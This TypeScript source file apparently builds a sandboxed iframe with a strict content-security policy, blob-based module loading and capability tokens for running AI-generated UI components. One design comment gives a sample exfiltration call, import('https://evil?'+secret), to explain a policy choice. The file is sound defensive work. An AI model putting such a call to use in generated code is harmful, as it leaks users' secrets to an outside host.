import type { ActionRequest, ActionResult, UINode } from "@vendoai/core";
import type { MessageEndpoint } from "./protocol";
import { makeRpc } from "./bridge";
import { STAGE_RUNTIME_SRC } from "./runtime";

// ── CSP ──────────────────────────────────────────────────────────────────────

const CSP_BASE = [
  "default-src 'none'",
  // script-src is built per-call with a nonce (see buildSrcdoc)
  "style-src 'unsafe-inline'",
  "img-src data:",
  "font-src data:",
  "connect-src 'none'",
].join("; ");

// ── buildSrcdoc ───────────────────────────────────────────────────────────────

/**
 * Pure: returns the srcdoc HTML for the sandboxed iframe.
 *
 * When `reactRuntimeSrc` is provided the srcdoc includes a synchronous
 * (non-module) bootstrap script that runs *before* the deferred module
 * runtime.  It:
 *   1. Creates a blob: URL from the React shim source.
 *   2. Records it as `window.__VENDO_REACT_URL` for the runtime.
 *   3. Injects `<script type="importmap">` mapping "react", "react-dom",
 *      "react-dom/client", and "react/jsx-runtime" to that blob URL.
 *
 * Because non-module scripts execute synchronously during parsing and module
 * scripts are deferred until after parsing, the import map is guaranteed to be
 * in place before the module runtime executes its first `import()`.
 *
 * Without `reactRuntimeSrc` the original self-contained bundle path is used
 * unchanged (the bundle ships its own React and sets window.__React).
 */
/**
 * Furnished sandbox environment (remix-fidelity epic). All sources are STRINGS
 * the host fetched on its own origin — they are blobbed here so the iframe's
 * CSP (`connect-src 'none'`, nonce/blob scripts only) never changes. Static
 * `/vendo/env/*` URLs would be blocked inside the iframe by design.
 */
export interface StageEnv {
  /** Import specifier → module SOURCE (e.g. "lucide-react" → vendored ESM). */
  modules?: Record<string, string>;
  /** Host stylesheet, already sanitized to zero fetchable URLs by vendo sync. */
  css?: string;
  /** @tailwindcss/browser runtime source (blobbed + loaded so arbitrary host
   *  utility classes compile in-sandbox). */
  tailwindRuntimeSrc?: string;
}

export function buildSrcdoc(reactRuntimeSrc?: string, env?: StageEnv): string {
  const nonce = crypto.randomUUID().replace(/-/g, "");
  // No 'strict-dynamic': it lets trusted scripts dynamically load ANY script
  // URL (allowlists are ignored), which is a data-exfil channel once generated
  // (AI-written) code runs in the realm — import("https://evil?"+secret).
  // All legitimate loading (React shim, host bundle, generated modules) is
  // blob-URL import(), which the explicit blob: source keeps working. The
  // dynamically created importmap script below carries its own nonce because
  // strict-dynamic no longer propagates trust to inserted scripts.
  const csp = `script-src 'nonce-${nonce}' blob:; ${CSP_BASE}`;

  const safeInline = (s: string) => JSON.stringify(s).replace(/</g, "\\u003c");
  let reactSetupScript = "";
  if (reactRuntimeSrc) {
    // Embed the shim source as a JSON string literal safe for inline HTML.
    // Escape < so "</script>" cannot appear inside the <script> body.
    const safeJson = safeInline(reactRuntimeSrc);
    // Env modules: each vendored source becomes its own blob, added to the
    // import map alongside React. Blob-only — the CSP is untouched.
    const envModuleEntries = Object.entries(env?.modules ?? {});
    const envMapSetup = envModuleEntries
      .map(
        ([specifier], i) =>
          `var _e${i}=URL.createObjectURL(new Blob([${safeInline(env!.modules![specifier]!)}],{type:"text/javascript"}));`,
      )
      .join("");
    // Import specifier KEYS are attacker-influenceable strings — harden them
    // with the SAME `<`-escaping as module bodies (a specifier containing
    // `</script>` would otherwise break the inline script parse), and assign
    // into a null-proto object so keys like "__proto__" become real entries
    // (Codex review). Values are blob-URL variable refs, not strings.
    const envMapAssign = envModuleEntries
      .map(([specifier], i) => `_imports[${safeInline(specifier)}]=_e${i};`)
      .join("");
    reactSetupScript =
      `<script nonce="${nonce}">` +
      `(function(){` +
      `var _s=${safeJson};` +
      `var _u=URL.createObjectURL(new Blob([_s],{type:"text/javascript"}));` +
      `window.__VENDO_REACT_URL=_u;` +
      envMapSetup +
      `var _imports=Object.create(null);` +
      `_imports["react"]=_u;` +
      `_imports["react-dom"]=_u;` +
      `_imports["react-dom/client"]=_u;` +
      `_imports["react/jsx-runtime"]=_u;` +
      envMapAssign +
      `var _im=document.createElement('script');` +
      `_im.type='importmap';` +
      `_im.nonce=${safeInline(nonce)};` +
      `_im.textContent=JSON.stringify({imports:_imports});` +
      `document.head.appendChild(_im);` +
      `import(_u).finally(function(){URL.revokeObjectURL(_u);});` +
      `})();` +
      `<\/script>`;
  }

  // Host CSS (already sanitized to zero fetchable URLs) + optional Tailwind JIT.
  // host.css first so its declarations lose to JIT-generated utilities only
  // where the JIT actually produces them.
  let envStyleScript = "";
  if (env?.css) {
    envStyleScript += `<style data-vendo-host-css>${env.css.replace(/<\/style/gi, "<\\/style")}</style>`;
  }
  if (env?.tailwindRuntimeSrc) {
    envStyleScript +=
      `<script type="module" nonce="${nonce}">` +
      `var _t=URL.createObjectURL(new Blob([${safeInline(env.tailwindRuntimeSrc)}],{type:"text/javascript"}));` +
      `import(_t).finally(function(){URL.revokeObjectURL(_t);});` +
      `<\/script>`;
  }
  // Baseline document styles: consume the injected --vendo-* brand vars so
  // bare generated markup starts from the host brand (font, fg color) instead
  // of the UA serif default with an 8px body margin. Fallbacks apply when no
  // theme is injected. Background stays transparent — the host page shows
  // through, matching the pre-existing behavior.
  const baselineStyle =
    `<style>` +
    `html,body{margin:0;padding:0}` +
    `body{` +
    `font-family:var(--vendo-font,ui-sans-serif,system-ui,sans-serif);` +
    `color:var(--vendo-fg,#111418);` +
    `background:transparent;` +
    `-webkit-font-smoothing:antialiased;` +
    `}` +
    `</style>`;

  return (
    `<!doctype html><html lang="en"><head>` +
    `<meta http-equiv="Content-Security-Policy" content="${csp}">` +
    `<title>Vendo Stage</title>` +
    baselineStyle +
    envStyleScript +
    `</head><body>${reactSetupScript}` +
    `<script type="module" nonce="${nonce}">${STAGE_RUNTIME_SRC}<\/script>` +
    `</body></html>`
  );
}

// ── Endpoint pair ─────────────────────────────────────────────────────────────

export interface StageEndpoints {
  /** Endpoint the host listens on for messages from the runtime. */
  listen: MessageEndpoint;
  /** Endpoint the host posts to; the runtime receives messages here. */
  post: MessageEndpoint;
}

// ── createStage (DOM-only, tested via browser suite) ─────────────────────────

/**
 * Creates and mounts a sandboxed iframe.
 * Returns the iframe and the endpoint pair needed by `connectStage`.
 *
 * `opts.reactSource` — if provided, the React shim source is embedded in the
 * srcdoc and an import map is set up so externalized host bundles share one
 * React instance. When omitted the self-contained bundle path is used.
 */
/** Host-owned ceiling for runtime-reported stage heights. In-sandbox code can
 *  post any `resize` payload it likes; the host clamps so a hostile component
 *  cannot force arbitrary host-page growth. */
const DEFAULT_MAX_STAGE_HEIGHT = 8192;

export function createStage(
  slot: HTMLElement,
  opts?: { reactSource?: string; maxStageHeight?: number; env?: StageEnv },
): {
  iframe: HTMLIFrameElement;
  endpoints: StageEndpoints;
  /** Deterministic teardown of the resize listener (and any pending frame).
   *  Call alongside removing the iframe — the listener does NOT die with it. */
  dispose: () => void;
} {
  const iframe = document.createElement("iframe");
  iframe.id = "vendo-stage";
  iframe.title = "Vendo stage";
  iframe.setAttribute("sandbox", "allow-scripts"); // no allow-same-origin → opaque origin
  iframe.srcdoc = buildSrcdoc(opts?.reactSource, opts?.env);
  iframe.style.cssText = "width:100%;min-height:1px;border:0;";
  slot.appendChild(iframe);

  // Auto-size: the runtime posts { vendo:true, type:"resize", height } from a
  // ResizeObserver on its documentElement; consume it here so the iframe tracks
  // its content instead of clipping at the UA default height. Lives in
  // createStage (the DOM layer) rather than connectStage, which is DOM-free.
  // Untrusted input: ANY in-sandbox code can post this message, so heights are
  // validated (finite, positive) and clamped to a host-owned max, and applies
  // are coalesced to one per animation frame.
  const maxHeight = opts?.maxStageHeight ?? DEFAULT_MAX_STAGE_HEIGHT;
  let pendingHeight: number | null = null;
  let frame: number | null = null;
  const onResize = (e: MessageEvent) => {
    if (e.source !== iframe.contentWindow) return;
    const d = e.data as { vendo?: boolean; type?: string; height?: number } | undefined;
    if (d?.vendo !== true || d.type !== "resize") return;
    const h = d.height;
    if (typeof h !== "number" || !Number.isFinite(h) || h <= 0) return;
    pendingHeight = Math.min(h, maxHeight);
    frame ??= requestAnimationFrame(() => {
      frame = null;
      if (pendingHeight !== null && iframe.isConnected) {
        iframe.style.height = `${pendingHeight}px`;
      }
      pendingHeight = null;
    });
  };
  window.addEventListener("message", onResize);
  const dispose = () => {
    window.removeEventListener("message", onResize);
    if (frame !== null) cancelAnimationFrame(frame);
    frame = null;
    pendingHeight = null;
  };

  // Wrap contentWindow.postMessage to supply the required targetOrigin ("*").
  // The MessageEndpoint interface only takes one argument, but the browser's
  // Window.postMessage requires targetOrigin — without it Chrome throws.
  const postEndpoint: MessageEndpoint = {
    postMessage: (msg) => iframe.contentWindow!.postMessage(msg, "*"),
    addEventListener: () => {},
    removeEventListener: () => {},
  };

  // Source-filtered listen: only forward messages from this iframe's contentWindow.
  // NOTE: srcdoc iframes are opaque-origin so e.origin === "null" — do NOT use origin;
  // e.source identity is the reliable guard.
  const registeredHandlers = new Map<
    (e: { data: unknown }) => void,
    (e: MessageEvent) => void
  >();
  const listenEndpoint: MessageEndpoint = {
    postMessage: () => {},
    addEventListener(_type, handler) {
      const wrapped = (e: MessageEvent) => {
        if (e.source !== iframe.contentWindow) return;
        if (!e.data || (e.data as Record<string, unknown>).vendo !== true) return;
        handler({ data: e.data });
      };
      registeredHandlers.set(handler, wrapped);
      window.addEventListener("message", wrapped);
    },
    removeEventListener(_type, handler) {
      const wrapped = registeredHandlers.get(handler);
      if (wrapped) {
        window.removeEventListener("message", wrapped);
        registeredHandlers.delete(handler);
      }
    },
  };

  return {
    iframe,
    endpoints: {
      listen: listenEndpoint,
      post: postEndpoint,
    },
    dispose,
  };
}

// ── Types ─────────────────────────────────────────────────────────────────────

/** Payload for `controller.initialize()`. */
export interface StageInitPayload {
  theme: Record<string, string>;
  state: Record<string, unknown>;
  bundleSource: string;
  tree: UINode;
  /** Tier 2.5: name → ESM component source, loaded as blob modules in-sandbox. */
  generatedComponents?: Record<string, string>;
  /** The anchor's live data object (payload `data.anchor`): injected as
   *  `window.__vendoAnchorData` so the swr shim resolves keys from it
   *  (remix fast-edits — the shim shipped in PR #35 but nothing fed it). */
  anchorData?: Record<string, unknown>;
  /**
   * Opaque theme blob for the in-sandbox component library (OpenUI). Forwarded
   * unchanged into `ui/initialize`; the runtime hands it to the host bundle's
   * `__VENDO_THEME_WRAP__` without ever inspecting its shape. Typed `unknown`
   * to keep @vendoai/stage decoupled from @vendoai/components/OpenUI.
   */
  componentTheme?: unknown;
}

/** Payload for `controller.update()`. */
export interface StageUpdatePayload {
  theme?: Record<string, string>;
  state?: Record<string, unknown>;
  /** Refreshed anchor data (live context re-patch) for the swr shim. */
  anchorData?: Record<string, unknown>;
  /**
   * Node patch. `nodeId` and `node` travel as one unit — you cannot pass one
   * without the other (the runtime rejects a partial patch).
   */
  replace?: { nodeId: string; node: UINode };
}

/** Callback the host app provides to handle every validated action. */
export type OnAction = (req: ActionRequest) => Promise<ActionResult | { pending: true }>;

/** Controller returned by `connectStage`. */
export interface StageController {
  /**
   * Resolves when the runtime posts its `{ vendo:true, type:"ready" }`
   * notification, or rejects with a `sandbox` error if it never arrives within
   * the ready timeout.
   */
  ready: Promise<void>;
  initialize(payload: StageInitPayload): Promise<unknown>;
  update(update: StageUpdatePayload): Promise<unknown>;
  /** Resolve a parked approval-pending action with a successful result. */
  resolveAction(actionId: string, result: ActionResult): void;
  /**
   * Cancel a parked approval-pending action: settles the runtime-side promise
   * with an error so it never leaks, and drops the id from the pending set.
   */
  cancelAction(actionId: string, reason?: string): void;
  dispose(): void;
}

// ── Capability helpers ────────────────────────────────────────────────────────

type NodeLike = { id: string; children?: NodeLike[] } & Record<string, unknown>;

function mintToken(): string {
  return `cap-${crypto.randomUUID()}`;
}

function mintActionId(): string {
  return `act-${crypto.randomUUID()}`;
}

function mintRequestId(): string {
  return `req-${crypto.randomUUID()}`;
}

/**
 * Walks the tree recursively, minting a unique capability token per node id
 * and attaching it as `capability` on each node. Returns the augmented tree.
 */
function attachCapabilities(node: NodeLike, map: Map<string, string>): NodeLike {
  const token = mintToken();
  map.set(node.id, token);
  const children = Array.isArray(node.children)
    ? node.children.map((c) => attachCapabilities(c, map))
    : undefined;
  return { ...node, capability: token, ...(children !== undefined ? { children } : {}) };
}

/**
 * Walks an already-augmented tree and (re)builds the id → token map by reading
 * each node's existing `capability`. Mirrors the runtime's buildCapabilityMap so
 * only live node ids retain tokens. Does NOT mint new tokens.
 */
function collectCapabilities(node: NodeLike | null, map: Map<string, string>): void {
  if (!node) return;
  const cap = (node as Record<string, unknown>).capability;
  if (node.id && typeof cap === "string") map.set(node.id, cap);
  if (Array.isArray(node.children)) node.children.forEach((c) => collectCapabilities(c, map));
}

/** Recursive find-and-replace by id (host mirror of the runtime helper). */
function replaceNode(node: NodeLike | null, targetId: string, newNode: NodeLike): NodeLike | null {
  if (!node) return node;
  if (node.id === targetId) return newNode;
  if (!Array.isArray(node.children) || node.children.length === 0) return node;
  return { ...node, children: node.children.map((c) => replaceNode(c, targetId, newNode) as NodeLike) };
}

// ── connectStage ──────────────────────────────────────────────────────────────

/**
 * The testable core: wires the RPC bridge and exposes the `StageController`.
 * Does not touch the real DOM or `window` — only uses `MessageEndpoint`s.
 */
export function connectStage(
  endpoints: StageEndpoints,
  { onAction, readyTimeoutMs = 10_000 }: { onAction: OnAction; readyTimeoutMs?: number },
): StageController {
  const capabilityMap = new Map<string, string>();
  const pendingActionIds = new Set<string>();
  // Host-side copy of the (capability-augmented) current tree. Used to rebuild
  // the capability map from scratch on every initialize/update so stale tokens
  // for removed/replaced node ids never linger.
  let currentTree: NodeLike | null = null;

  // ready: resolves when the runtime posts { vendo:true, type:"ready" }, or
  // rejects with a sandbox error if it never arrives. This is NOT an RPC call —
  // it's a one-way notification, so we handle it with a dedicated listener.
  let resolveReady!: () => void;
  let rejectReady!: (e: Error) => void;
  let readySettled = false;
  const ready = new Promise<void>((res, rej) => { resolveReady = res; rejectReady = rej; });
  const readyTimer = setTimeout(() => {
    if (readySettled) return;
    readySettled = true;
    rejectReady(Object.assign(new Error("stage did not become ready in time"), { code: "sandbox" }));
  }, readyTimeoutMs);
  const readyHandler = (e: { data: unknown }) => {
    const d = e.data as Record<string, unknown>;
    if (d?.vendo === true && d?.type === "ready") {
      if (readySettled) return;
      readySettled = true;
      clearTimeout(readyTimer);
      resolveReady();
    }
  };
  endpoints.listen.addEventListener("message", readyHandler);

  const rpc = makeRpc(endpoints.listen, endpoints.post, async (method, params) => {
    if (method === "tools/call") {
      const p = params as {
        name: string;
        originNodeId: string;
        capability: unknown;
        payload?: unknown;
      };

      // Capability chokepoint: unknown node or wrong token → bridge error
      const expectedToken = capabilityMap.get(p.originNodeId);
      if (!expectedToken || expectedToken !== p.capability) {
        throw new Error(`capability mismatch for node "${p.originNodeId}"`);
      }

      // Map to F1 ActionRequest
      const req: ActionRequest = {
        requestId: mintRequestId(),
        originNodeId: p.originNodeId,
        action: p.name,
        payload: p.payload,
        capability: p.capability,
      };

      const outcome = await onAction(req);

      // Approval-pending: defer resolution; runtime waits for ui/action-result
      if ("pending" in outcome && outcome.pending === true) {
        const actionId = mintActionId();
        pendingActionIds.add(actionId);
        return { status: "pending", actionId };
      }

      return outcome;
    }

    throw new Error(`unknown method: ${method}`);
  });

  return {
    ready,

    initialize(payload) {
      // Fresh tree → clear the map, then mint tokens for exactly this tree.
      capabilityMap.clear();
      const augmentedTree = attachCapabilities(payload.tree as unknown as NodeLike, capabilityMap);
      currentTree = augmentedTree;
      return rpc.call("ui/initialize", { ...payload, tree: augmentedTree });
    },

    update(update) {
      const payload: { theme?: Record<string, string>; state?: Record<string, unknown>; replace?: { nodeId: string; node: UINode } } = {};
      if (update.theme) payload.theme = update.theme;
      if (update.state) payload.state = update.state;
      if (update.replace) {
        const { nodeId, node } = update.replace;
        // Mint fresh tokens for the replacement subtree, splice it into our tree
        // copy, then rebuild the whole map from the resulting tree so that only
        // live node ids retain tokens (replaced descendants are dropped).
        const augmentedNode = attachCapabilities(node as unknown as NodeLike, new Map());
        currentTree = replaceNode(currentTree, nodeId, augmentedNode);
        capabilityMap.clear();
        collectCapabilities(currentTree, capabilityMap);
        payload.replace = { nodeId, node: augmentedNode as unknown as UINode };
      }
      return rpc.call("ui/update", payload);
    },

    resolveAction(actionId, result) {
      if (!pendingActionIds.has(actionId)) {
        throw new Error(`resolveAction: unknown actionId "${actionId}"`);
      }
      pendingActionIds.delete(actionId);
      // Post the notification directly (not via RPC — no response expected).
      // The runtime's message listener catches method === "ui/action-result".
      endpoints.post.postMessage({
        vendo: true,
        method: "ui/action-result",
        params: { actionId, result },
      });
    },

    cancelAction(actionId, reason) {
      // Tolerant: a cancel that races a resolve is a harmless no-op.
      if (!pendingActionIds.has(actionId)) return;
      pendingActionIds.delete(actionId);
      // Deliver an error result so the runtime-side promise settles (rejects)
      // instead of leaking forever.
      endpoints.post.postMessage({
        vendo: true,
        method: "ui/action-result",
        params: { actionId, error: { code: "abort", message: reason ?? "action cancelled" } },
      });
    },

    dispose() {
      clearTimeout(readyTimer);
      endpoints.listen.removeEventListener("message", readyHandler);
      pendingActionIds.clear();
      // Best-effort teardown so the runtime rejects any outstanding approvals.
      try {
        endpoints.post.postMessage({ vendo: true, method: "ui/teardown" });
      } catch {
        // ignore — endpoint may already be gone
      }
      rpc.dispose();
    },
  };
}
